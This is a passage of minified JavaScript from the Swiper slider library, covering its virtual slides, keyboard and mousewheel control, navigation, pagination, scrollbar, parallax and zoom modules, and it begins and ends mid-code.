            update: function (e) {
                var t = this, n = (h = t.params).slidesPerView, i = h.slidesPerGroup, r = h.centeredSlides,
                    a = (f = t.params.virtual).addSlidesBefore, s = f.addSlidesAfter, l = (m = t.virtual).from, c = m.to,
                    u = m.slides, d = m.slidesGrid, p = m.renderSlide, h = m.offset;
                t.updateActiveIndex();
                var f = t.activeIndex || 0, m = t.rtlTranslate ? "right" : t.isHorizontal() ? "left" : "top",
                    v = (s = r ? (y = Math.floor(n / 2) + i + a, Math.floor(n / 2) + i + s) : (y = n + (i - 1) + a, i + s), Math.max((f || 0) - s, 0)),
                    g = Math.min((f || 0) + y, u.length - 1), y = (t.slidesGrid[v] || 0) - (t.slidesGrid[0] || 0);

                function b() {
                    t.updateSlides(), t.updateProgress(), t.updateSlidesClasses(), t.lazy && t.params.lazy.enabled && t.lazy.load()
                }

                if (o.extend(t.virtual, {
                    from: v,
                    to: g,
                    offset: y,
                    slidesGrid: t.slidesGrid
                }), l === v && c === g && !e) return t.slidesGrid !== d && y !== h && t.slides.css(m, y + "px"), void t.updateProgress();
                if (t.params.virtual.renderExternal) return t.params.virtual.renderExternal.call(t, {
                    offset: y,
                    from: v,
                    to: g,
                    slides: function () {
                        for (var e = [], t = v; t <= g; t += 1) e.push(u[t]);
                        return e
                    }()
                }), void b();
                var x = [], w = [];
                if (e) t.$wrapperEl.find("." + t.params.slideClass).remove(); else for (var S = l; S <= c; S += 1) (S < v || g < S) && t.$wrapperEl.find("." + t.params.slideClass + '[data-swiper-slide-index="' + S + '"]').remove();
                for (var E = 0; E < u.length; E += 1) v <= E && E <= g && (void 0 === c || e ? w.push(E) : (c < E && w.push(E), E < l && x.push(E)));
                w.forEach((function (e) {
                    t.$wrapperEl.append(p(u[e], e))
                })), x.sort((function (e, t) {
                    return t - e
                })).forEach((function (e) {
                    t.$wrapperEl.prepend(p(u[e], e))
                })), t.$wrapperEl.children(".swiper-slide").css(m, y + "px"), b()
            }, renderSlide: function (e, t) {
                var n = this, r = n.params.virtual;
                return r.cache && n.virtual.cache[t] ? n.virtual.cache[t] : ((e = r.renderSlide ? i(r.renderSlide.call(n, e, t)) : i('<div class="' + n.params.slideClass + '" data-swiper-slide-index="' + t + '">' + e + "</div>")).attr("data-swiper-slide-index") || e.attr("data-swiper-slide-index", t), r.cache && (n.virtual.cache[t] = e), e)
            }, appendSlide: function (e) {
                if ("object" == typeof e && "length" in e) for (var t = 0; t < e.length; t += 1) e[t] && this.virtual.slides.push(e[t]); else this.virtual.slides.push(e);
                this.virtual.update(!0)
            }, prependSlide: function (e) {
                var t, n, i = this, r = i.activeIndex, a = r + 1, s = 1;
                if (Array.isArray(e)) {
                    for (var o = 0; o < e.length; o += 1) e[o] && i.virtual.slides.unshift(e[o]);
                    a = r + e.length, s = e.length
                } else i.virtual.slides.unshift(e);
                i.params.virtual.cache && (t = i.virtual.cache, n = {}, Object.keys(t).forEach((function (e) {
                    n[parseInt(e, 10) + s] = t[e]
                })), i.virtual.cache = n), i.virtual.update(!0), i.slideTo(a, 0)
            }, removeSlide: function (e) {
                var t = this;
                if (null != e) {
                    var n = t.activeIndex;
                    if (Array.isArray(e)) for (var i = e.length - 1; 0 <= i; --i) t.virtual.slides.splice(e[i], 1), t.params.virtual.cache && delete t.virtual.cache[e[i]], e[i] < n && --n, n = Math.max(n, 0); else t.virtual.slides.splice(e, 1), t.params.virtual.cache && delete t.virtual.cache[e], e < n && --n, n = Math.max(n, 0);
                    t.virtual.update(!0), t.slideTo(n, 0)
                }
            }, removeAllSlides: function () {
                var e = this;
                e.virtual.slides = [], e.params.virtual.cache && (e.virtual.cache = {}), e.virtual.update(!0), e.slideTo(0, 0)
            }
        }), D = (g = {
            name: "virtual",
            params: {
                virtual: {
                    enabled: !1,
                    slides: [],
                    cache: !0,
                    renderSlide: null,
                    renderExternal: null,
                    addSlidesBefore: 0,
                    addSlidesAfter: 0
                }
            },
            create: function () {
                var e = this;
                o.extend(e, {
                    virtual: {
                        update: A.update.bind(e),
                        appendSlide: A.appendSlide.bind(e),
                        prependSlide: A.prependSlide.bind(e),
                        removeSlide: A.removeSlide.bind(e),
                        removeAllSlides: A.removeAllSlides.bind(e),
                        renderSlide: A.renderSlide.bind(e),
                        slides: e.params.virtual.slides,
                        cache: {}
                    }
                })
            },
            on: {
                beforeInit: function () {
                    var e, t = this;
                    t.params.virtual.enabled && (t.classNames.push(t.params.containerModifierClass + "virtual"), o.extend(t.params, e = {watchSlidesProgress: !0}), o.extend(t.originalParams, e), t.params.initialSlide || t.virtual.update())
                }, setTranslate: function () {
                    this.params.virtual.enabled && this.virtual.update()
                }
            }
        }, {
            handle: function (e) {
                var i = this, r = i.rtlTranslate, a = e,
                    s = (a = a.originalEvent ? a.originalEvent : a).keyCode || a.charCode;
                if (!i.allowSlideNext && (i.isHorizontal() && 39 === s || i.isVertical() && 40 === s)) return !1;
                if (!i.allowSlidePrev && (i.isHorizontal() && 37 === s || i.isVertical() && 38 === s)) return !1;
                if (!(a.shiftKey || a.altKey || a.ctrlKey || a.metaKey || t.activeElement && t.activeElement.nodeName && ("input" === t.activeElement.nodeName.toLowerCase() || "textarea" === t.activeElement.nodeName.toLowerCase()))) {
                    if (i.params.keyboard.onlyInViewport && (37 === s || 39 === s || 38 === s || 40 === s)) {
                        var o = !1;
                        if (0 < i.$el.parents("." + i.params.slideClass).length && 0 === i.$el.parents("." + i.params.slideActiveClass).length) return;
                        var l = n.innerWidth, c = n.innerHeight;
                        e = i.$el.offset();
                        r && (e.left -= i.$el[0].scrollLeft);
                        for (var u = [[e.left, e.top], [e.left + i.width, e.top], [e.left, e.top + i.height], [e.left + i.width, e.top + i.height]], d = 0; d < u.length; d += 1) {
                            var p = u[d];
                            0 <= p[0] && p[0] <= l && 0 <= p[1] && p[1] <= c && (o = !0)
                        }
                        if (!o) return
                    }
                    i.isHorizontal() ? (37 !== s && 39 !== s || (a.preventDefault ? a.preventDefault() : a.returnValue = !1), (39 === s && !r || 37 === s && r) && i.slideNext(), (37 === s && !r || 39 === s && r) && i.slidePrev()) : (38 !== s && 40 !== s || (a.preventDefault ? a.preventDefault() : a.returnValue = !1), 40 === s && i.slideNext(), 38 === s && i.slidePrev()), i.emit("keyPress", s)
                }
            }, enable: function () {
                this.keyboard.enabled || (i(t).on("keydown", this.keyboard.handle), this.keyboard.enabled = !0)
            }, disable: function () {
                this.keyboard.enabled && (i(t).off("keydown", this.keyboard.handle), this.keyboard.enabled = !1)
            }
        }), N = (y = {
            name: "keyboard", params: {keyboard: {enabled: !1, onlyInViewport: !0}}, create: function () {
                o.extend(this, {
                    keyboard: {
                        enabled: !1,
                        enable: D.enable.bind(this),
                        disable: D.disable.bind(this),
                        handle: D.handle.bind(this)
                    }
                })
            }, on: {
                init: function () {
                    this.params.keyboard.enabled && this.keyboard.enable()
                }, destroy: function () {
                    this.keyboard.enabled && this.keyboard.disable()
                }
            }
        }, {
            lastScrollTime: o.now(),
            event: -1 < n.navigator.userAgent.indexOf("firefox") ? "DOMMouseScroll" : ((x = (b = "onwheel") in t) || ((u = t.createElement("div")).setAttribute(b, "return;"), x = "function" == typeof u[b]), (x = !x && t.implementation && t.implementation.hasFeature && !0 !== t.implementation.hasFeature("", "") ? t.implementation.hasFeature("Events.wheel", "3.0") : x) ? "wheel" : "mousewheel"),
            normalize: function (e) {
                var t = 0, n = 0, i = 0, r = 0;
                return "detail" in e && (n = e.detail), "wheelDelta" in e && (n = -e.wheelDelta / 120), "wheelDeltaY" in e && (n = -e.wheelDeltaY / 120), "wheelDeltaX" in e && (t = -e.wheelDeltaX / 120), "axis" in e && e.axis === e.HORIZONTAL_AXIS && (t = n, n = 0), i = 10 * t, r = 10 * n, "deltaY" in e && (r = e.deltaY), ((i = "deltaX" in e ? e.deltaX : i) || r) && e.deltaMode && (1 === e.deltaMode ? (i *= 40, r *= 40) : (i *= 800, r *= 800)), {
                    spinX: t = i && !t ? i < 1 ? -1 : 1 : t,
                    spinY: n = r && !n ? r < 1 ? -1 : 1 : n,
                    pixelX: i,
                    pixelY: r
                }
            },
            handleMouseEnter: function () {
                this.mouseEntered = !0
            },
            handleMouseLeave: function () {
                this.mouseEntered = !1
            },
            handle: function (e) {
                var t = e, i = this, r = i.params.mousewheel;
                if (!i.mouseEntered && !r.releaseOnEdges) return !0;
                t.originalEvent && (t = t.originalEvent);
                var a = 0, s = i.rtlTranslate ? -1 : 1, l = N.normalize(t);
                if (r.forceToAxis) if (i.isHorizontal()) {
                    if (!(Math.abs(l.pixelX) > Math.abs(l.pixelY))) return !0;
                    a = l.pixelX * s
                } else {
                    if (!(Math.abs(l.pixelY) > Math.abs(l.pixelX))) return !0;
                    a = l.pixelY
                } else a = Math.abs(l.pixelX) > Math.abs(l.pixelY) ? -l.pixelX * s : -l.pixelY;
                if (0 === a) return !0;
                if (r.invert && (a = -a), i.params.freeMode) {
                    if (i.params.loop && i.loopFix(), e = i.getTranslate() + a * r.sensitivity, s = i.isBeginning, l = i.isEnd, (e = e >= i.minTranslate() ? i.minTranslate() : e) <= i.maxTranslate() && (e = i.maxTranslate()), i.setTransition(0), i.setTranslate(e), i.updateProgress(), i.updateActiveIndex(), i.updateSlidesClasses(), (!s && i.isBeginning || !l && i.isEnd) && i.updateSlidesClasses(), i.params.freeModeSticky && (clearTimeout(i.mousewheel.timeout), i.mousewheel.timeout = o.nextTick((function () {
                        i.slideToClosest()
                    }), 300)), i.emit("scroll", t), i.params.autoplay && i.params.autoplayDisableOnInteraction && i.autoplay.stop(), e === i.minTranslate() || e === i.maxTranslate()) return !0
                } else {
                    if (60 < o.now() - i.mousewheel.lastScrollTime) if (a < 0) if (i.isEnd && !i.params.loop || i.animating) {
                        if (r.releaseOnEdges) return !0
                    } else i.slideNext(), i.emit("scroll", t); else if (i.isBeginning && !i.params.loop || i.animating) {
                        if (r.releaseOnEdges) return !0
                    } else i.slidePrev(), i.emit("scroll", t);
                    i.mousewheel.lastScrollTime = (new n.Date).getTime()
                }
                return t.preventDefault ? t.preventDefault() : t.returnValue = !1, !1
            },
            enable: function () {
                var e = this;
                if (!N.event) return !1;
                if (e.mousewheel.enabled) return !1;
                var t = e.$el;
                return (t = "container" !== e.params.mousewheel.eventsTarged ? i(e.params.mousewheel.eventsTarged) : t).on("mouseenter", e.mousewheel.handleMouseEnter), t.on("mouseleave", e.mousewheel.handleMouseLeave), t.on(N.event, e.mousewheel.handle), e.mousewheel.enabled = !0
            },
            disable: function () {
                var e = this;
                if (!N.event) return !1;
                if (!e.mousewheel.enabled) return !1;
                var t = e.$el;
                return (t = "container" !== e.params.mousewheel.eventsTarged ? i(e.params.mousewheel.eventsTarged) : t).off(N.event, e.mousewheel.handle), !(e.mousewheel.enabled = !1)
            }
        }), $ = {
            update: function () {
                var e, t, n = this, i = n.params.navigation;
                n.params.loop || (e = (t = n.navigation).$nextEl, (t = t.$prevEl) && 0 < t.length && (n.isBeginning ? t.addClass(i.disabledClass) : t.removeClass(i.disabledClass), t[n.params.watchOverflow && n.isLocked ? "addClass" : "removeClass"](i.lockClass)), e && 0 < e.length && (n.isEnd ? e.addClass(i.disabledClass) : e.removeClass(i.disabledClass), e[n.params.watchOverflow && n.isLocked ? "addClass" : "removeClass"](i.lockClass)))
            }, onPrevClick: function (e) {
                e.preventDefault(), this.isBeginning && !this.params.loop || this.slidePrev()
            }, onNextClick: function (e) {
                e.preventDefault(), this.isEnd && !this.params.loop || this.slideNext()
            }, init: function () {
                var e, t, n = this, r = n.params.navigation;
                (r.nextEl || r.prevEl) && (r.nextEl && (e = i(r.nextEl), n.params.uniqueNavElements && "string" == typeof r.nextEl && 1 < e.length && 1 === n.$el.find(r.nextEl).length && (e = n.$el.find(r.nextEl))), r.prevEl && (t = i(r.prevEl), n.params.uniqueNavElements && "string" == typeof r.prevEl && 1 < t.length && 1 === n.$el.find(r.prevEl).length && (t = n.$el.find(r.prevEl))), e && 0 < e.length && e.on("click", n.navigation.onNextClick), t && 0 < t.length && t.on("click", n.navigation.onPrevClick), o.extend(n.navigation, {
                    $nextEl: e,
                    nextEl: e && e[0],
                    $prevEl: t,
                    prevEl: t && t[0]
                }))
            }, destroy: function () {
                var e = this, t = (n = e.navigation).$nextEl, n = n.$prevEl;
                t && t.length && (t.off("click", e.navigation.onNextClick), t.removeClass(e.params.navigation.disabledClass)), n && n.length && (n.off("click", e.navigation.onPrevClick), n.removeClass(e.params.navigation.disabledClass))
            }
        }, O = {
            update: function () {
                var e = this, t = e.rtl, n = e.params.pagination;
                if (n.el && e.pagination.el && e.pagination.$el && 0 !== e.pagination.$el.length) {
                    var r, a = (e.virtual && e.params.virtual.enabled ? e.virtual : e).slides.length, s = e.pagination.$el,
                        o = e.params.loop ? Math.ceil((a - 2 * e.loopedSlides) / e.params.slidesPerGroup) : e.snapGrid.length;
                    if (e.params.loop ? ((r = Math.ceil((e.activeIndex - e.loopedSlides) / e.params.slidesPerGroup)) > a - 1 - 2 * e.loopedSlides && (r -= a - 2 * e.loopedSlides), o - 1 < r && (r -= o), r < 0 && "bullets" !== e.params.paginationType && (r = o + r)) : r = void 0 !== e.snapIndex ? e.snapIndex : e.activeIndex || 0, "bullets" === n.type && e.pagination.bullets && 0 < e.pagination.bullets.length) {
                        var l, c, u, d, p, h = e.pagination.bullets;
                        if (n.dynamicBullets && (e.pagination.bulletSize = h.eq(0)[e.isHorizontal() ? "outerWidth" : "outerHeight"](!0), s.css(e.isHorizontal() ? "width" : "height", e.pagination.bulletSize * (n.dynamicMainBullets + 4) + "px"), 1 < n.dynamicMainBullets && void 0 !== e.previousIndex && (e.pagination.dynamicBulletIndex += r - e.previousIndex, e.pagination.dynamicBulletIndex > n.dynamicMainBullets - 1 ? e.pagination.dynamicBulletIndex = n.dynamicMainBullets - 1 : e.pagination.dynamicBulletIndex < 0 && (e.pagination.dynamicBulletIndex = 0)), l = r - e.pagination.dynamicBulletIndex, u = ((c = l + (Math.min(h.length, n.dynamicMainBullets) - 1)) + l) / 2), h.removeClass(n.bulletActiveClass + " " + n.bulletActiveClass + "-next " + n.bulletActiveClass + "-next-next " + n.bulletActiveClass + "-prev " + n.bulletActiveClass + "-prev-prev " + n.bulletActiveClass + "-main"), 1 < s.length) h.each((function (e, t) {
                            var a = i(t);
                            (t = a.index()) === r && a.addClass(n.bulletActiveClass), n.dynamicBullets && (l <= t && t <= c && a.addClass(n.bulletActiveClass + "-main"), t === l && a.prev().addClass(n.bulletActiveClass + "-prev").prev().addClass(n.bulletActiveClass + "-prev-prev"), t === c && a.next().addClass(n.bulletActiveClass + "-next").next().addClass(n.bulletActiveClass + "-next-next"))
                        })); else if (h.eq(r).addClass(n.bulletActiveClass), n.dynamicBullets) {
                            for (var f = h.eq(l), m = (a = h.eq(c), l); m <= c; m += 1) h.eq(m).addClass(n.bulletActiveClass + "-main");
                            f.prev().addClass(n.bulletActiveClass + "-prev").prev().addClass(n.bulletActiveClass + "-prev-prev"), a.next().addClass(n.bulletActiveClass + "-next").next().addClass(n.bulletActiveClass + "-next-next")
                        }
                        n.dynamicBullets && (p = Math.min(h.length, n.dynamicMainBullets + 4), d = (e.pagination.bulletSize * p - e.pagination.bulletSize) / 2 - u * e.pagination.bulletSize, p = t ? "right" : "left", h.css(e.isHorizontal() ? p : "top", d + "px"))
                    }
                    "fraction" === n.type && (s.find("." + n.currentClass).text(n.formatFractionCurrent(r + 1)), s.find("." + n.totalClass).text(n.formatFractionTotal(o))), "progressbar" === n.type && (u = n.progressbarOpposite ? e.isHorizontal() ? "vertical" : "horizontal" : e.isHorizontal() ? "horizontal" : "vertical", t = (r + 1) / o, d = p = 1, "horizontal" == u ? p = t : d = t, s.find("." + n.progressbarFillClass).transform("translate3d(0,0,0) scaleX(" + p + ") scaleY(" + d + ")").transition(e.params.speed)), "custom" === n.type && n.renderCustom ? (s.html(n.renderCustom(e, r + 1, o)), e.emit("paginationRender", e, s[0])) : e.emit("paginationUpdate", e, s[0]), s[e.params.watchOverflow && e.isLocked ? "addClass" : "removeClass"](n.lockClass)
                }
            }, render: function () {
                var e = this, t = e.params.pagination;
                if (t.el && e.pagination.el && e.pagination.$el && 0 !== e.pagination.$el.length) {
                    var n = (e.virtual && e.params.virtual.enabled ? e.virtual : e).slides.length, i = e.pagination.$el,
                        r = "";
                    if ("bullets" === t.type) {
                        for (var a = e.params.loop ? Math.ceil((n - 2 * e.loopedSlides) / e.params.slidesPerGroup) : e.snapGrid.length, s = 0; s < a; s += 1) t.renderBullet ? r += t.renderBullet.call(e, s, t.bulletClass) : r += "<" + t.bulletElement + ' class="' + t.bulletClass + '"></' + t.bulletElement + ">";
                        i.html(r), e.pagination.bullets = i.find("." + t.bulletClass)
                    }
                    "fraction" === t.type && (r = t.renderFraction ? t.renderFraction.call(e, t.currentClass, t.totalClass) : '<span class="' + t.currentClass + '"></span> / <span class="' + t.totalClass + '"></span>', i.html(r)), "progressbar" === t.type && (r = t.renderProgressbar ? t.renderProgressbar.call(e, t.progressbarFillClass) : '<span class="' + t.progressbarFillClass + '"></span>', i.html(r)), "custom" !== t.type && e.emit("paginationRender", e.pagination.$el[0])
                }
            }, init: function () {
                var e, t = this, n = t.params.pagination;
                !n.el || 0 !== (e = i(n.el)).length && (t.params.uniqueNavElements && "string" == typeof n.el && 1 < e.length && 1 === t.$el.find(n.el).length && (e = t.$el.find(n.el)), "bullets" === n.type && n.clickable && e.addClass(n.clickableClass), e.addClass(n.modifierClass + n.type), "bullets" === n.type && n.dynamicBullets && (e.addClass("" + n.modifierClass + n.type + "-dynamic"), t.pagination.dynamicBulletIndex = 0, n.dynamicMainBullets < 1 && (n.dynamicMainBullets = 1)), "progressbar" === n.type && n.progressbarOpposite && e.addClass(n.progressbarOppositeClass), n.clickable && e.on("click", "." + n.bulletClass, (function (e) {
                    e.preventDefault(), e = i(this).index() * t.params.slidesPerGroup, t.params.loop && (e += t.loopedSlides), t.slideTo(e)
                })), o.extend(t.pagination, {$el: e, el: e[0]}))
            }, destroy: function () {
                var e, t = this, n = t.params.pagination;
                n.el && t.pagination.el && t.pagination.$el && 0 !== t.pagination.$el.length && ((e = t.pagination.$el).removeClass(n.hiddenClass), e.removeClass(n.modifierClass + n.type), t.pagination.bullets && t.pagination.bullets.removeClass(n.bulletActiveClass), n.clickable && e.off("click", "." + n.bulletClass))
            }
        }, _ = {
            setTranslate: function () {
                var e, t, n, i, r, a, s, o, c = this;
                c.params.scrollbar.el && c.scrollbar.el && (s = c.scrollbar, e = c.rtlTranslate, o = c.progress, t = s.dragSize, n = s.trackSize, i = s.$dragEl, r = s.$el, a = c.params.scrollbar, o = (n - (s = t)) * o, e ? 0 < (o = -o) ? (s = t - o, o = 0) : n < -o + t && (s = n + o) : o < 0 ? (s = t + o, o = 0) : n < o + t && (s = n - o), c.isHorizontal() ? (l.transforms3d ? i.transform("translate3d(" + o + "px, 0, 0)") : i.transform("translateX(" + o + "px)"), i[0].style.width = s + "px") : (l.transforms3d ? i.transform("translate3d(0px, " + o + "px, 0)") : i.transform("translateY(" + o + "px)"), i[0].style.height = s + "px"), a.hide && (clearTimeout(c.scrollbar.timeout), r[0].style.opacity = 1, c.scrollbar.timeout = setTimeout((function () {
                    r[0].style.opacity = 0, r.transition(400)
                }), 1e3)))
            }, setTransition: function (e) {
                this.params.scrollbar.el && this.scrollbar.el && this.scrollbar.$dragEl.transition(e)
            }, updateSize: function () {
                var e, t, n, i, r, a, s, l = this;
                l.params.scrollbar.el && l.scrollbar.el && (t = (e = l.scrollbar).$dragEl, n = e.$el, t[0].style.width = "", t[0].style.height = "", i = l.isHorizontal() ? n[0].offsetWidth : n[0].offsetHeight, a = (r = l.size / l.virtualSize) * (i / l.size), s = "auto" === l.params.scrollbar.dragSize ? i * r : parseInt(l.params.scrollbar.dragSize, 10), l.isHorizontal() ? t[0].style.width = s + "px" : t[0].style.height = s + "px", n[0].style.display = 1 <= r ? "none" : "", l.params.scrollbar.hide && (n[0].style.opacity = 0), o.extend(e, {
                    trackSize: i,
                    divider: r,
                    moveDivider: a,
                    dragSize: s
                }), e.$el[l.params.watchOverflow && l.isLocked ? "addClass" : "removeClass"](l.params.scrollbar.lockClass))
            }, setDragPosition: function (e) {
                var t = this, n = t.scrollbar, i = t.rtlTranslate, r = n.$el, a = n.dragSize;
                n = n.trackSize, a = ((t.isHorizontal() ? "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX || e.clientX : "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY || e.clientY) - r.offset()[t.isHorizontal() ? "left" : "top"] - a / 2) / (n - a);
                a = Math.max(Math.min(a, 1), 0), i && (a = 1 - a), a = t.minTranslate() + (t.maxTranslate() - t.minTranslate()) * a, t.updateProgress(a), t.setTranslate(a), t.updateActiveIndex(), t.updateSlidesClasses()
            }, onDragStart: function (e) {
                var t = this, n = t.params.scrollbar, i = t.scrollbar, r = t.$wrapperEl, a = i.$el, s = i.$dragEl;
                t.scrollbar.isTouched = !0, e.preventDefault(), e.stopPropagation(), r.transition(100), s.transition(100), i.setDragPosition(e), clearTimeout(t.scrollbar.dragTimeout), a.transition(0), n.hide && a.css("opacity", 1), t.emit("scrollbarDragStart", e)
            }, onDragMove: function (e) {
                var t = this.scrollbar, n = this.$wrapperEl, i = t.$el, r = t.$dragEl;
                this.scrollbar.isTouched && (e.preventDefault ? e.preventDefault() : e.returnValue = !1, t.setDragPosition(e), n.transition(0), i.transition(0), r.transition(0), this.emit("scrollbarDragMove", e))
            }, onDragEnd: function (e) {
                var t = this, n = t.params.scrollbar, i = t.scrollbar.$el;
                t.scrollbar.isTouched && (t.scrollbar.isTouched = !1, n.hide && (clearTimeout(t.scrollbar.dragTimeout), t.scrollbar.dragTimeout = o.nextTick((function () {
                    i.css("opacity", 0), i.transition(400)
                }), 1e3)), t.emit("scrollbarDragEnd", e), n.snapOnRelease && t.slideToClosest())
            }, enableDraggable: function () {
                var e, n, i, r, a, s = this;
                s.params.scrollbar.el && (r = s.scrollbar, e = s.touchEventsTouch, n = s.touchEventsDesktop, a = s.params, i = r.$el[0], r = !(!l.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                }, a = !(!l.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                }, l.touch ? (i.addEventListener(e.start, s.scrollbar.onDragStart, r), i.addEventListener(e.move, s.scrollbar.onDragMove, r), i.addEventListener(e.end, s.scrollbar.onDragEnd, a)) : (i.addEventListener(n.start, s.scrollbar.onDragStart, r), t.addEventListener(n.move, s.scrollbar.onDragMove, r), t.addEventListener(n.end, s.scrollbar.onDragEnd, a)))
            }, disableDraggable: function () {
                var e, n, i, r, a, s = this;
                s.params.scrollbar.el && (r = s.scrollbar, e = s.touchEventsTouch, n = s.touchEventsDesktop, a = s.params, i = r.$el[0], r = !(!l.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                }, a = !(!l.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                }, l.touch ? (i.removeEventListener(e.start, s.scrollbar.onDragStart, r), i.removeEventListener(e.move, s.scrollbar.onDragMove, r), i.removeEventListener(e.end, s.scrollbar.onDragEnd, a)) : (i.removeEventListener(n.start, s.scrollbar.onDragStart, r), t.removeEventListener(n.move, s.scrollbar.onDragMove, r), t.removeEventListener(n.end, s.scrollbar.onDragEnd, a)))
            }, init: function () {
                var e, t, n, r, a = this;
                a.params.scrollbar.el && (e = a.scrollbar, r = a.$el, n = i((t = a.params.scrollbar).el), 0 === (r = (n = a.params.uniqueNavElements && "string" == typeof t.el && 1 < n.length && 1 === r.find(t.el).length ? r.find(t.el) : n).find("." + a.params.scrollbar.dragClass)).length && (r = i('<div class="' + a.params.scrollbar.dragClass + '"></div>'), n.append(r)), o.extend(e, {
                    $el: n,
                    el: n[0],
                    $dragEl: r,
                    dragEl: r[0]
                }), t.draggable && e.enableDraggable())
            }, destroy: function () {
                this.scrollbar.disableDraggable()
            }
        }, H = {
            setTransform: function (e, t) {
                var n = this.rtl, r = i(e), a = n ? -1 : 1, s = r.attr("data-swiper-parallax") || "0",
                    o = r.attr("data-swiper-parallax-x"), l = r.attr("data-swiper-parallax-y");
                e = r.attr("data-swiper-parallax-scale"), n = r.attr("data-swiper-parallax-opacity");
                o || l ? (o = o || "0", l = l || "0") : this.isHorizontal() ? (o = s, l = "0") : (l = s, o = "0"), o = 0 <= o.indexOf("%") ? parseInt(o, 10) * t * a + "%" : o * t * a + "px", l = 0 <= l.indexOf("%") ? parseInt(l, 10) * t + "%" : l * t + "px", null != n && (n -= (n - 1) * (1 - Math.abs(t)), r[0].style.opacity = n), null == e ? r.transform("translate3d(" + o + ", " + l + ", 0px)") : (t = e - (e - 1) * (1 - Math.abs(t)), r.transform("translate3d(" + o + ", " + l + ", 0px) scale(" + t + ")"))
            }, setTranslate: function () {
                var e = this, t = e.$el, n = e.slides, r = e.progress, a = e.snapGrid;
                t.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each((function (t, n) {
                    e.parallax.setTransform(n, r)
                })), n.each((function (t, n) {
                    var s = n.progress;
                    1 < e.params.slidesPerGroup && "auto" !== e.params.slidesPerView && (s += Math.ceil(t / 2) - r * (a.length - 1)), s = Math.min(Math.max(s, -1), 1), i(n).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each((function (t, n) {
                        e.parallax.setTransform(n, s)
                    }))
                }))
            }, setTransition: function (e) {
                void 0 === e && (e = this.params.speed), this.$el.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each((function (t, n) {
                    var r = i(n);
                    n = parseInt(r.attr("data-swiper-parallax-duration"), 10) || e;
                    0 === e && (n = 0), r.transition(n)
                }))
            }
        }, z = {
            getDistanceBetweenTouches: function (e) {
                if (e.targetTouches.length < 2) return 1;
                var t = e.targetTouches[0].pageX, n = e.targetTouches[0].pageY, i = e.targetTouches[1].pageX;
                e = e.targetTouches[1].pageY;
                return Math.sqrt(Math.pow(i - t, 2) + Math.pow(e - n, 2))
            }, onGestureStart: function (e) {
                var t = this, n = t.params.zoom, r = t.zoom, a = r.gesture;
                if (r.fakeGestureTouched = !1, r.fakeGestureMoved = !1, !l.gestures) {
                    if ("touchstart" !== e.type || "touchstart" === e.type && e.targetTouches.length < 2) return;
                    r.fakeGestureTouched = !0, a.scaleStart = z.getDistanceBetweenTouches(e)
                }
                a.$slideEl && a.$slideEl.length || (a.$slideEl = i(e.target).closest(".swiper-slide"), 0 === a.$slideEl.length && (a.$slideEl = t.slides.eq(t.activeIndex)), a.$imageEl = a.$slideEl.find("img, svg, canvas"), a.$imageWrapEl = a.$imageEl.parent("." + n.containerClass), a.maxRatio = a.$imageWrapEl.attr("data-swiper-zoom") || n.maxRatio, 0 !== a.$imageWrapEl.length) ? (a.$imageEl.transition(0), t.zoom.isScaling = !0) : a.$imageEl = void 0
            }, onGestureChange: function (e) {
                var t = this.params.zoom, n = this.zoom, i = n.gesture;
                if (!l.gestures) {
                    if ("touchmove" !== e.type || "touchmove" === e.type && e.targetTouches.length < 2) return;
                    n.fakeGestureMoved = !0, i.scaleMove = z.getDistanceBetweenTouches(e)
                }
                i.$imageEl && 0 !== i.$imageEl.length && (n.scale = l.gestures ? e.scale * n.currentScale : i.scaleMove / i.scaleStart * n.currentScale, n.scale > i.maxRatio && (n.scale = i.maxRatio - 1 + Math.pow(n.scale - i.maxRatio + 1, .5)), n.scale < t.minRatio && (n.scale = t.minRatio + 1 - Math.pow(t.minRatio - n.scale + 1, .5)), i.$imageEl.transform("translate3d(0,0,0) scale(" + n.scale + ")"))
            }, onGestureEnd: function (e) {
                var t = this.params.zoom, n = this.zoom, i = n.gesture;
                if (!l.gestures) {
                    if (!n.fakeGestureTouched || !n.fakeGestureMoved) return;
                    if ("touchend" !== e.type || "touchend" === e.type && e.changedTouches.length < 2 && !w.android) return;
                    n.fakeGestureTouched = !1, n.fakeGestureMoved = !1
                }
                i.$imageEl && 0 !== i.$imageEl.length && (n.scale = Math.max(Math.min(n.scale, i.maxRatio), t.minRatio), i.$imageEl.transition(this.params.speed).transform("translate3d(0,0,0) scale(" + n.scale + ")"), n.currentScale = n.scale, n.isScaling = !1, 1 === n.scale && (i.$slideEl = void 0))
            }, onTouchStart: function (e) {
                var t = (n = this.zoom).gesture, n = n.image;
                t.$imageEl && 0 !== t.$imageEl.length && (n.isTouched || (w.android && e.preventDefault(), n.isTouched = !0, n.touchesStart.x = ("touchstart" === e.type ? e.targetTouches[0] : e).pageX, n.touchesStart.y = ("touchstart" === e.type ? e.targetTouches[0] : e).pageY))
            }, onTouchMove: function (e) {
                var t = this, n = t.zoom, i = n.gesture, r = n.image, a = n.velocity;
                if (i.$imageEl && 0 !== i.$imageEl.length && (t.allowClick = !1, r.isTouched && i.$slideEl)) {
                    r.isMoved || (r.width = i.$imageEl[0].offsetWidth, r.height = i.$imageEl[0].offsetHeight, r.startX = o.getTranslate(i.$imageWrapEl[0], "x") || 0, r.startY = o.getTranslate(i.$imageWrapEl[0], "y") || 0, i.slideWidth = i.$slideEl[0].offsetWidth, i.slideHeight = i.$slideEl[0].offsetHeight, i.$imageWrapEl.transition(0), t.rtl && (r.startX = -r.startX, r.startY = -r.startY));
                    var s = r.width * n.scale, l = r.height * n.scale;
                    if (!(s < i.slideWidth && l < i.slideHeight)) {
